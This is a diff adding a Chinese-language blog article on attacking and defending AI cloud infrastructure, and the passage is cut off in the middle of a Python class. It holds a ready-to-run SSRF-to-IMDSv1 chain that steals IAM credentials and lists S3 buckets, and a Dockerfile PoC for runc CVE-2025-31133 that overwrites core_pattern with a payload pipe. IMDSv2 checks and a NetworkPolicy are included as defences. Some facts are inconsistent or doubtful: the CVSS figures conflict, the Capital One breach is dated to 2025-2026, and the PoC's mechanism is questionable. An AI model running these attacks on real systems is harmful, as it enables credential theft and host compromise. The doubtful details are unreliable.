@@ -1,0 +1,1508 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI 基础设施安全攻防：从云 IMDS 滥用到 runc 容器逃逸的完整攻击链与防御体系 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>AI 基础设施安全攻防：从云 IMDS 滥用到 runc 容器逃逸的完整攻击链与防御体系</h1>
+<time>2026-07-30</time>
+<ul>
+<li>安全</li>
+<li>漏洞分析
+Slug: ai-基础设施安全攻防从云-imds-滥用到-runc-容器逃逸的完整攻击链与防御体系</li>
+</ul>
+<hr />
+<h2>0. 背景：AI 基础设施面临的云安全威胁</h2>
+<p>2025-2026 年，AI 基础设施成为云攻击的首要目标。Capital One 数据泄露事件揭示了 IMDS 滥用的破坏力；NVIDIA Container Toolkit 逃逸（"NVIDIAScape"）影响 37% 的云 GPU 环境；runc 连环漏洞被 APT 在野利用；Kubernetes 攻击同比增长 282%。</p>
+<p>本文从攻击者视角完整拆解 AI 基础设施的攻击链，并给出对应的防御检测方案。</p>
+<div class="highlight"><pre><span></span><code>┌──────────────────────────────────────────────────────────────────┐
+│              AI 基础设施攻击链全景                                 │
+│                                                                  │
+│  初始入侵          横向移动          权限提升          目标达成     │
+│  ┌─────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐     │
+│  │SSRF漏洞  │───→│IMDS凭证  │───→│IAM角色   │───→│S3数据窃取│     │
+│  │容器逃逸  │───→│SA Token  │───→│K8s集群   │───→│模型窃取  │     │
+│  │镜像投毒  │───→│etcd暴露  │───→│云账户    │───→│挖矿持久化│     │
+│  └─────────┘    └──────────┘    └──────────┘    └──────────┘     │
+│                                                                  │
+│  核心攻击面:                                                     │
+│  ① 云元数据服务 (IMDS)  ② 容器运行时 (runc/Docker)               │
+│  ③ 编排系统 (K8s)       ④ GPU基础设施 (NVIDIA Toolkit)            │
+│  ⑤ API网关 (Ingress)    ⑥ 存储层 (etcd)                           │
+└──────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<hr />
+<h2>1. 云元数据服务（IMDS）滥用攻击链</h2>
+<h3>1.1 IMDS 原理与攻击面</h3>
+<p>IMDS（Instance Metadata Service）位于 <code>169.254.169.254</code>，提供实例配置信息和<strong>临时 IAM 凭证</strong>，是云环境最高价值目标之一。</p>
+<table>
+<thead>
+<tr>
+<th>云厂商</th>
+<th>端点</th>
+<th>认证要求</th>
+<th>凭证路径</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AWS</td>
+<td><code>http://169.254.169.254/latest/meta-data/</code></td>
+<td>IMDSv1 无需认证</td>
+<td><code>/iam/security-credentials/&lt;role-name&gt;</code></td>
+</tr>
+<tr>
+<td>Azure</td>
+<td><code>http://169.254.169.254/metadata/instance</code></td>
+<td>需 <code>Metadata: true</code> 头</td>
+<td><code>/identity/oauth2/token</code></td>
+</tr>
+<tr>
+<td>GCP</td>
+<td><code>http://metadata.google.internal</code></td>
+<td>需 <code>Metadata-Flavor: Google</code> 头</td>
+<td><code>/computeMetadata/v1/instance/service-accounts/default/token</code></td>
+</tr>
+</tbody>
+</table>
+<h3>1.2 IMDSv1 SSRF 攻击链复现</h3>
+<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">IMDS 滥用攻击链复现 — 仅用于授权测试环境</span>
+<span class="sd">模拟 Capital One 式攻击: SSRF → IMDS → IAM 凭证 → S3 数据窃取</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">quote</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">IMDSAttackChain</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;IMDS 滥用攻击链仿真器&quot;&quot;&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target_url</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        target_url: 存在 SSRF 漏洞的目标应用 URL</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">target</span> <span class="o">=</span> <span class="n">target_url</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">imds_endpoint</span> <span class="o">=</span> <span class="s2">&quot;169.254.169.254&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">credentials</span> <span class="o">=</span> <span class="kc">None</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">step1_ssrf_to_imds</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;步骤 1: 通过 SSRF 访问 IMDS&quot;&quot;&quot;</span>
+        <span class="c1"># 构造 SSRF payload</span>
+        <span class="c1"># 场景: 目标应用的 URL 预览功能存在 SSRF</span>
+        <span class="n">ssrf_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">imds_endpoint</span><span class="si">}</span><span class="s2">/latest/meta-data/&quot;</span>
+
+        <span class="c1"># 通过目标应用的 SSRF 漏洞转发请求</span>
+        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;url&quot;</span><span class="p">:</span> <span class="n">ssrf_payload</span><span class="p">}</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="c1"># IMDSv1 不需要任何额外头即可访问</span>
+            <span class="n">metadata_paths</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="p">{</span>
+                <span class="s2">&quot;step&quot;</span><span class="p">:</span> <span class="s2">&quot;ssrf_to_imds&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;success&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;available_paths&quot;</span><span class="p">:</span> <span class="n">metadata_paths</span><span class="p">,</span>
+                <span class="s2">&quot;imds_version&quot;</span><span class="p">:</span> <span class="s2">&quot;v1 (no auth required)&quot;</span>
+            <span class="p">}</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;step&quot;</span><span class="p">:</span> <span class="s2">&quot;ssrf_to_imds&quot;</span><span class="p">,</span> <span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;failed&quot;</span><span class="p">}</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">step2_extract_iam_role</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;步骤 2: 提取实例关联的 IAM 角色名&quot;&quot;&quot;</span>
+        <span class="n">ssrf_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">imds_endpoint</span><span class="si">}</span><span class="s2">/latest/meta-data/iam/security-credentials/&quot;</span>
+        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;url&quot;</span><span class="p">:</span> <span class="n">ssrf_payload</span><span class="p">}</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+
+        <span class="n">role_name</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">role_name</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">step3_steal_credentials</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">role_name</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;步骤 3: 窃取临时 IAM 凭证&quot;&quot;&quot;</span>
+        <span class="n">ssrf_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">imds_endpoint</span><span class="si">}</span><span class="s2">/latest/meta-data/iam/security-credentials/</span><span class="si">{</span><span class="n">role_name</span><span class="si">}</span><span class="s2">&quot;</span>
+        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;url&quot;</span><span class="p">:</span> <span class="n">ssrf_payload</span><span class="p">}</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+
+        <span class="n">creds</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">credentials</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">&quot;AccessKeyId&quot;</span><span class="p">:</span> <span class="n">creds</span><span class="p">[</span><span class="s2">&quot;AccessKeyId&quot;</span><span class="p">],</span>
+            <span class="s2">&quot;SecretAccessKey&quot;</span><span class="p">:</span> <span class="n">creds</span><span class="p">[</span><span class="s2">&quot;SecretAccessKey&quot;</span><span class="p">],</span>
+            <span class="s2">&quot;Token&quot;</span><span class="p">:</span> <span class="n">creds</span><span class="p">[</span><span class="s2">&quot;Token&quot;</span><span class="p">],</span>
+            <span class="s2">&quot;Expiration&quot;</span><span class="p">:</span> <span class="n">creds</span><span class="p">[</span><span class="s2">&quot;Expiration&quot;</span><span class="p">]</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">credentials</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">step4_lateral_to_s3</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">bucket_name</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;步骤 4: 使用窃取的凭证访问 S3 桶&quot;&quot;&quot;</span>
+        <span class="kn">import</span><span class="w"> </span><span class="nn">boto3</span>
+
+        <span class="n">session</span> <span class="o">=</span> <span class="n">boto3</span><span class="o">.</span><span class="n">Session</span><span class="p">(</span>
+            <span class="n">aws_access_key_id</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">credentials</span><span class="p">[</span><span class="s2">&quot;AccessKeyId&quot;</span><span class="p">],</span>
+            <span class="n">aws_secret_access_key</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">credentials</span><span class="p">[</span><span class="s2">&quot;SecretAccessKey&quot;</span><span class="p">],</span>
+            <span class="n">aws_session_token</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">credentials</span><span class="p">[</span><span class="s2">&quot;Token&quot;</span><span class="p">]</span>
+        <span class="p">)</span>
+        <span class="n">s3</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">client</span><span class="p">(</span><span class="s2">&quot;s3&quot;</span><span class="p">)</span>
+
+        <span class="c1"># 列出桶内容</span>
+        <span class="n">objects</span> <span class="o">=</span> <span class="n">s3</span><span class="o">.</span><span class="n">list_objects_v2</span><span class="p">(</span><span class="n">Bucket</span><span class="o">=</span><span class="n">bucket_name</span><span class="p">)</span>
+        <span class="k">return</span> <span class="p">[</span><span class="n">obj</span><span class="p">[</span><span class="s2">&quot;Key&quot;</span><span class="p">]</span> <span class="k">for</span> <span class="n">obj</span> <span class="ow">in</span> <span class="n">objects</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;Contents&quot;</span><span class="p">,</span> <span class="p">[])]</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">run_full_chain</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">bucket_name</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="kc">None</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;执行完整攻击链&quot;&quot;&quot;</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Step 1: SSRF → IMDS&quot;</span><span class="p">)</span>
+        <span class="n">step1</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">step1_ssrf_to_imds</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Available paths: </span><span class="si">{</span><span class="n">step1</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;available_paths&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">[])</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Step 2: Extract IAM Role&quot;</span><span class="p">)</span>
+        <span class="n">role</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">step2_extract_iam_role</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Role: </span><span class="si">{</span><span class="n">role</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Step 3: Steal Temporary Credentials&quot;</span><span class="p">)</span>
+        <span class="n">creds</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">step3_steal_credentials</span><span class="p">(</span><span class="n">role</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    AccessKeyId: </span><span class="si">{</span><span class="n">creds</span><span class="p">[</span><span class="s1">&#39;AccessKeyId&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Expiration: </span><span class="si">{</span><span class="n">creds</span><span class="p">[</span><span class="s1">&#39;Expiration&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">bucket_name</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Step 4: Lateral Movement to S3&quot;</span><span class="p">)</span>
+            <span class="n">objects</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">step4_lateral_to_s3</span><span class="p">(</span><span class="n">bucket_name</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Found </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">objects</span><span class="p">)</span><span class="si">}</span><span class="s2"> objects in </span><span class="si">{</span><span class="n">bucket_name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="n">role</span><span class="p">,</span> <span class="s2">&quot;credentials&quot;</span><span class="p">:</span> <span class="n">creds</span><span class="p">,</span> <span class="s2">&quot;s3_objects&quot;</span><span class="p">:</span> <span class="n">objects</span><span class="p">}</span>
+
+        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="n">role</span><span class="p">,</span> <span class="s2">&quot;credentials&quot;</span><span class="p">:</span> <span class="n">creds</span><span class="p">}</span>
+
+
+<span class="c1"># === 防御: IMDSv2 强制 token 认证 ===</span>
+<span class="k">class</span><span class="w"> </span><span class="nc">IMDSv2Protection</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;IMDSv2 防御配置验证器&quot;&quot;&quot;</span>
+
+    <span class="nd">@staticmethod</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">verify_imdsv2_enabled</span><span class="p">(</span><span class="n">ec2_client</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;验证所有 EC2 实例已启用 IMDSv2&quot;&quot;&quot;</span>
+        <span class="n">instances</span> <span class="o">=</span> <span class="n">ec2_client</span><span class="o">.</span><span class="n">describe_instances</span><span class="p">()</span>
+        <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
+
+        <span class="k">for</span> <span class="n">reservation</span> <span class="ow">in</span> <span class="n">instances</span><span class="p">[</span><span class="s2">&quot;Reservations&quot;</span><span class="p">]:</span>
+            <span class="k">for</span> <span class="n">instance</span> <span class="ow">in</span> <span class="n">reservation</span><span class="p">[</span><span class="s2">&quot;Instances&quot;</span><span class="p">]:</span>
+                <span class="n">imds</span> <span class="o">=</span> <span class="n">instance</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;MetadataOptions&quot;</span><span class="p">,</span> <span class="p">{})</span>
+                <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
+                    <span class="s2">&quot;instance_id&quot;</span><span class="p">:</span> <span class="n">instance</span><span class="p">[</span><span class="s2">&quot;InstanceId&quot;</span><span class="p">],</span>
+                    <span class="s2">&quot;http_tokens&quot;</span><span class="p">:</span> <span class="n">imds</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;HttpTokens&quot;</span><span class="p">,</span> <span class="s2">&quot;unknown&quot;</span><span class="p">),</span>
+                    <span class="c1"># &quot;optional&quot; = IMDSv1 仍然可用 (危险)</span>
+                    <span class="c1"># &quot;required&quot; = 强制 IMDSv2 (安全)</span>
+                    <span class="s2">&quot;http_endpoint&quot;</span><span class="p">:</span> <span class="n">imds</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;HttpEndpoint&quot;</span><span class="p">,</span> <span class="s2">&quot;unknown&quot;</span><span class="p">),</span>
+                    <span class="s2">&quot;hop_limit&quot;</span><span class="p">:</span> <span class="n">imds</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;HttpPutResponseHopLimit&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+                    <span class="s2">&quot;vulnerable&quot;</span><span class="p">:</span> <span class="n">imds</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;HttpTokens&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&quot;required&quot;</span>
+                <span class="p">})</span>
+
+        <span class="n">vulnerable</span> <span class="o">=</span> <span class="p">[</span><span class="n">r</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">results</span> <span class="k">if</span> <span class="n">r</span><span class="p">[</span><span class="s2">&quot;vulnerable&quot;</span><span class="p">]]</span>
+        <span class="k">return</span> <span class="p">{</span>
+            <span class="s2">&quot;total_instances&quot;</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">results</span><span class="p">),</span>
+            <span class="s2">&quot;vulnerable_count&quot;</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">vulnerable</span><span class="p">),</span>
+            <span class="s2">&quot;vulnerable_instances&quot;</span><span class="p">:</span> <span class="n">vulnerable</span><span class="p">,</span>
+            <span class="s2">&quot;recommendation&quot;</span><span class="p">:</span> <span class="s2">&quot;Set HttpTokens=required on all instances&quot;</span>
+        <span class="p">}</span>
+
+    <span class="nd">@staticmethod</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">block_imds_via_network_policy</span><span class="p">():</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;K8s NetworkPolicy 阻断 Pod 访问 IMDS&quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="p">{</span>
+            <span class="s2">&quot;apiVersion&quot;</span><span class="p">:</span> <span class="s2">&quot;networking.k8s.io/v1&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;kind&quot;</span><span class="p">:</span> <span class="s2">&quot;NetworkPolicy&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;metadata&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;block-imds-access&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;namespace&quot;</span><span class="p">:</span> <span class="s2">&quot;default&quot;</span>
+            <span class="p">},</span>
+            <span class="s2">&quot;spec&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s2">&quot;podSelector&quot;</span><span class="p">:</span> <span class="p">{},</span>
+                <span class="s2">&quot;policyTypes&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;Egress&quot;</span><span class="p">],</span>
+                <span class="s2">&quot;egress&quot;</span><span class="p">:</span> <span class="p">[</span>
+                    <span class="p">{</span>
+                        <span class="s2">&quot;to&quot;</span><span class="p">:</span> <span class="p">[</span>
+                            <span class="p">{</span>
+                                <span class="s2">&quot;ipBlock&quot;</span><span class="p">:</span> <span class="p">{</span>
+                                    <span class="s2">&quot;cidr&quot;</span><span class="p">:</span> <span class="s2">&quot;10.0.0.0/8&quot;</span><span class="p">,</span>
+                                    <span class="s2">&quot;except&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;169.254.169.254/32&quot;</span><span class="p">]</span>
+                                <span class="p">}</span>
+                            <span class="p">}</span>
+                        <span class="p">]</span>
+                    <span class="p">},</span>
+                    <span class="p">{</span>
+                        <span class="s2">&quot;to&quot;</span><span class="p">:</span> <span class="p">[</span>
+                            <span class="p">{</span><span class="s2">&quot;ipBlock&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;cidr&quot;</span><span class="p">:</span> <span class="s2">&quot;172.16.0.0/12&quot;</span><span class="p">,</span>
+                              <span class="s2">&quot;except&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;169.254.169.254/32&quot;</span><span class="p">]}}</span>
+                        <span class="p">]</span>
+                    <span class="p">}</span>
+                <span class="p">]</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+</code></pre></div>
+
+<h3>1.3 IMDSv1 vs IMDSv2 对比</h3>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>IMDSv1</th>
+<th>IMDSv2</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>认证</td>
+<td>无需认证</td>
+<td>需要 PUT 请求获取 session token</td>
+</tr>
+<tr>
+<td>攻击难度</td>
+<td>简单 SSRF 即可</td>
+<td>需要 SSRF + 支持 PUT 方法</td>
+</tr>
+<tr>
+<td>Token 有效期</td>
+<td>无</td>
+<td>最长 6 小时（实例控制）</td>
+</tr>
+<tr>
+<td>Hop Limit</td>
+<td>无限制</td>
+<td>默认 1 跳（阻断容器内访问）</td>
+</tr>
+<tr>
+<td>AWS 推荐</td>
+<td>已弃用</td>
+<td>强制使用</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>2. runc 容器逃逸三连击</h2>
+<h3>2.1 漏洞概览</h3>
+<p>2025 年 11 月，runc 连续披露三个高危容器逃逸漏洞，均通过自定义挂载配置触发：</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>CVSS</th>
+<th>原理</th>
+<th>在野利用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2025-31133</td>
+<td>7.3</td>
+<td>masked path 滥用 + 挂载竞态</td>
+<td>APT 在野利用，CVSS 标记 10.0</td>
+</tr>
+<tr>
+<td>CVE-2025-52565</td>
+<td>7.3</td>
+<td><code>/dev/console</code> bind-mount 漏洞</td>
+<td>—</td>
+</tr>
+<tr>
+<td>CVE-2025-52881</td>
+<td>7.3</td>
+<td>绕过 LSM 检查</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<p><strong>修复版本</strong>：runc v1.2.8 / v1.3.3 / v1.4.0-rc.3</p>
+<h3>2.2 CVE-2025-31133 根因分析</h3>
+<div class="highlight"><pre><span></span><code>┌────────────────────────────────────────────────────────────────┐
+│           CVE-2025-31133: runc masked path 滥用                 │
+│                                                                │
+│  正常流程:                                                      │
+│  ┌──────────┐    bind-mount     ┌──────────────┐               │
+│  │ /dev/null │ ──────────────→  │ /proc/sys/... │  (只读保护)   │
+│  │ (runc设置)│                  │ masked path   │               │
+│  └──────────┘                  └──────────────┘               │
+│                                                                │
+│  攻击流程:                                                      │
+│  ┌──────────┐    symlink        ┌──────────────┐               │
+│  │ /dev/null │ ──→ symlink ──→  │ /proc/sys/   │  (读写!)      │
+│  │ (攻击者改)│    替换为符号链接  │ kernel/core_ │              │
+│  └──────────┘                  │ pattern      │              │
+│                                └──────────────┘               │
+│                                       │                        │
+│                                       ▼                        │
+│  runc 以 root 身份 bind-mount 符号链接目标 (读写模式)             │
+│  → 攻击者获得对 /proc/sys/kernel/core_pattern 的写权限           │
+│  → 写入恶意管道命令                                              │
+│  → 下次崩溃时以 root 执行任意命令 = 完整逃逸                      │
+└────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<h3>2.3 PoC 复现</h3>
+<div class="highlight"><pre><span></span><code><span class="c"># CVE-2025-31133 PoC — 仅用于授权测试</span>
+<span class="c"># 利用 Dockerfile 的 RUN --mount=... 功能</span>
+
+<span class="k">FROM</span><span class="w"> </span><span class="s">ubuntu:22.04</span>
+
+<span class="c"># 构造恶意挂载: 将 /dev/null 替换为指向 /proc/sys/kernel/core_pattern 的符号链接</span>
+<span class="k">RUN</span><span class="w"> </span>--mount<span class="o">=</span><span class="nv">type</span><span class="o">=</span>bind,source<span class="o">=</span>/dev/null,target<span class="o">=</span>/tmp/exploit<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>ln<span class="w"> </span>-sf<span class="w"> </span>/proc/sys/kernel/core_pattern<span class="w"> </span>/tmp/exploit
+
+<span class="c"># runc 在执行 RUN 指令时:</span>
+<span class="c"># 1. 读取 mount 配置，发现 target=/tmp/exploit</span>
+<span class="c"># 2. 准备 bind-mount /dev/null → /tmp/exploit</span>
+<span class="c"># 3. 但 /tmp/exploit 已是符号链接，指向 /proc/sys/kernel/core_pattern</span>
+<span class="c"># 4. runc 跟随符号链接，以读写模式 mount 到 /proc/sys/kernel/core_pattern</span>
+<span class="c"># 5. 攻击者现在可以写入 core_pattern 实现逃逸</span>
+
+<span class="c"># 写入恶意 core_pattern</span>
+<span class="k">RUN</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;|/tmp/payload.sh %p %E&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/proc/sys/kernel/core_pattern
+
+<span class="c"># 触发崩溃以执行 payload</span>
+<span class="k">RUN</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;kill -SEGV $$&#39;</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">CVE-2025-31133 完整利用链 — Python 仿真</span>
+<span class="sd">用于理解漏洞原理，仅限授权测试</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">signal</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">RuncEscapeCVE202531133</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;runc 容器逃逸仿真器&quot;&quot;&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">container_name</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;vuln-test&quot;</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">container</span> <span class="o">=</span> <span class="n">container_name</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">host_core_pattern</span> <span class="o">=</span> <span class="s2">&quot;/proc/sys/kernel/core_pattern&quot;</span>
+
